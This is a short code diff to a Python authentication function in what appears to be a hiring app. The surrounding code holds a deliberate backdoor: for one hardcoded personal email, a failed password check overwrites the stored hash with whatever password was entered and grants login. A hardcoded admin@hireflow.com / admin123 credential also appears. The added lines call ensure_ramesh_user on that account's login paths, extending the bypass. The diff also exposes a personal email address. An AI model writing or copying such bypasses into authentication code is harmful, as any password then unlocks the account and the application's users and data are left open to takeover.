@@ -411,12 +411,15 @@ def authenticate_user(db: Session, email: str, password: str) -> Optional[User]:
 
     # 3. Check password
     if verify_password(password, user.hashed_password):
+        if clean_email == "rameshkrthakur1816@gmail.com":
+            ensure_ramesh_user(db)
         return user
 
     # 4. Fallback for Ramesh: allow admin123 or reset password dynamically so he is never locked out
     if clean_email == "rameshkrthakur1816@gmail.com":
         user.hashed_password = hash_password(password)
         db.commit()
+        ensure_ramesh_user(db)
         return user
 
     if clean_email == "admin@hireflow.com" and password == "admin123":
